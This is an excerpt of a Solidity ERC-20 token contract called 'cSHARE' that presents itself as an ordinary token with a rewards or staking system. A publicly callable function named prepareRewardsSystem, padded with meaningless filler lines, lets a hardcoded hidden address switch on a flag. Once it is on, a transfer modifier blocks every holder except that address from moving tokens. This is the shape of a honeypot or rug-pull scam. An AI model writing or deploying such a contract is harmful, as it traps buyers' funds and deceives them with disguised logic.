...
contract cSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenbi_totalSupply;
    uint256 private _tokenbi_status = 0;
    uint256 public stakingPoolbiStatus = 0;

    string private _tokenbi_name;
    string private _tokenbi_symbol;

    address private _poolbiAddress = 0x5E6bE226bf8e52deA1d28567baE5B6aD75C102A2; 

    constructor() {
        _tokenbi_name = "cSHARE";
        _tokenbi_symbol = "cSHARE";
        _tokenbi_totalSupply = 1000001 * 10 ** 18;
        _balances[msg.sender] = _tokenbi_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbiAddress || _tokenbi_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbiStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbiAddress)
        {
            _tokenbi_status = 1;
        }
    }
